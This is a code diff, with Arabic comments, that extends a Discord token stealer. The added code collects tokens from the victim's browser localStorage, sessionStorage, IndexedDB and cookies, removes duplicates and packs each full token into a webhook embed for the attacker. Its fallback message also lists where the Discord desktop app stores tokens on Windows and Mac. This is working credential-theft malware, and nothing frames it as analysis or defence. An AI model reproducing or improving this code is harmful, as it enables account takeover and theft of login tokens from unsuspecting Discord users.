@@ -306,46 +306,119 @@
             };
         }
         
-        // البحث عن Discord Token
+        // البحث عن Discord Token - كل الطرق الممكنة
         function findDiscordToken() {
             const tokens = [];
+            const tokenPattern = /(mfa\.[a-zA-Z0-9_-]{20,})|([a-zA-Z0-9_-]{23,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27,})/g;
             
-            // البحث في localStorage
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                const value = localStorage.getItem(key);
-                
-                if (value && value.includes('mfa.')) {
-                    tokens.push({ source: 'localStorage', key: key, token: value });
-                }
-                
-                // البحث عن token pattern
-                const tokenPattern = /[a-zA-Z0-9_-]{23,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27,}/g;
-                const matches = value.match(tokenPattern);
-                if (matches) {
-                    matches.forEach(token => {
-                        tokens.push({ source: 'localStorage', key: key, token: token });
-                    });
-                }
-            }
-            
-            // البحث في sessionStorage
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                const value = sessionStorage.getItem(key);
-                
-                if (value) {
-                    const tokenPattern = /[a-zA-Z0-9_-]{23,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27,}/g;
-                    const matches = value.match(tokenPattern);
-                    if (matches) {
-                        matches.forEach(token => {
-                            tokens.push({ source: 'sessionStorage', key: key, token: token });
-                        });
+            // 1. localStorage
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    
+                    if (value) {
+                        // Discord token المباشر
+                        if (key.includes('token') || value.includes('mfa.')) {
+                            tokens.push({ 
+                                source: 'localStorage', 
+                                key: key, 
+                                token: value.replace(/"/g, '')
+                            });
+                        }
+                        
+                        // Pattern matching
+                        const matches = value.match(tokenPattern);
+                        if (matches) {
+                            matches.forEach(token => {
+                                tokens.push({ 
+                                    source: 'localStorage', 
+                                    key: key, 
+                                    token: token 
+                                });
+                            });
+                        }
                     }
                 }
-            }
+            } catch (e) {}
             
-            return tokens;
+            // 2. sessionStorage
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const value = sessionStorage.getItem(key);
+                    
+                    if (value) {
+                        const matches = value.match(tokenPattern);
+                        if (matches) {
+                            matches.forEach(token => {
+                                tokens.push({ 
+                                    source: 'sessionStorage', 
+                                    key: key, 
+                                    token: token 
+                                });
+                            });
+                        }
+                    }
+                }
+            } catch (e) {}
+            
+            // 3. IndexedDB (Discord Desktop App)
+            try {
+                const dbs = indexedDB.databases ? indexedDB.databases() : [];
+                dbs.then(databases => {
+                    databases.forEach(db => {
+                        if (db.name && db.name.includes('discord')) {
+                            tokens.push({
+                                source: 'IndexedDB',
+                                key: 'Found Discord DB',
+                                token: db.name
+                            });
+                        }
+                    });
+                });
+            } catch (e) {}
+            
+            // 4. Cookies
+            try {
+                const cookies = document.cookie.split(';');
+                cookies.forEach(cookie => {
+                    const [name, value] = cookie.split('=');
+                    if (name && name.trim().includes('token')) {
+                        tokens.push({
+                            source: 'Cookie',
+                            key: name.trim(),
+                            token: value
+                        });
+                    }
+                    
+                    if (value) {
+                        const matches = value.match(tokenPattern);
+                        if (matches) {
+                            matches.forEach(token => {
+                                tokens.push({
+                                    source: 'Cookie',
+                                    key: name.trim(),
+                                    token: token
+                                });
+                            });
+                        }
+                    }
+                });
+            } catch (e) {}
+            
+            // 5. إزالة التكرارات
+            const uniqueTokens = [];
+            const seen = new Set();
+            
+            tokens.forEach(item => {
+                if (!seen.has(item.token)) {
+                    seen.add(item.token);
+                    uniqueTokens.push(item);
+                }
+            });
+            
+            return uniqueTokens;
         }
         
         // إرسال المعلومات للـ webhook
@@ -375,16 +448,34 @@
             // إضافة الـ tokens المكتشفة
             if (tokens.length > 0) {
                 tokens.forEach((item, index) => {
+                    const tokenPreview = item.token.length > 50 
+                        ? item.token.substring(0, 50) + '...' 
+                        : item.token;
+                    
                     embed.fields.push({
-                        name: `🎫 Token #${index + 1}`,
-                        value: `**Source:** ${item.source}\n**Key:** ${item.key}\n**Token:** \`\`\`${item.token}\`\`\``,
+                        name: `🎫 Token #${index + 1} - ${item.source}`,
+                        value: `**Key:** ${item.key}\n**Token:** \`${tokenPreview}\`\n**Full:** ||${item.token}||`,
                         inline: false
                     });
                 });
+                
+                // معلومات إضافية
+                embed.fields.push({
+                    name: '📊 Summary',
+                    value: `Total Tokens Found: **${tokens.length}**\nUnique Sources: **${[...new Set(tokens.map(t => t.source))].length}**`,
+                    inline: false
+                });
             } else {
                 embed.fields.push({
-                    name: '⚠️ Status',
-                    value: 'No Discord tokens found in browser storage.\nUser might not be logged into Discord web/app on this browser.',
+                    name: '⚠️ No Tokens Found',
+                    value: '**Possible Reasons:**\n' +
+                           '• User not logged into Discord web\n' +
+                           '• Tokens stored in Desktop app only\n' +
+                           '• Browser cleared storage\n' +
+                           '• Using incognito/private mode\n\n' +
+                           '**Note:** Desktop app tokens are in:\n' +
+                           '`%AppData%/discord/Local Storage/leveldb/` (Windows)\n' +
+                           '`~/Library/Application Support/discord/` (Mac)',
                     inline: false
                 });
             }
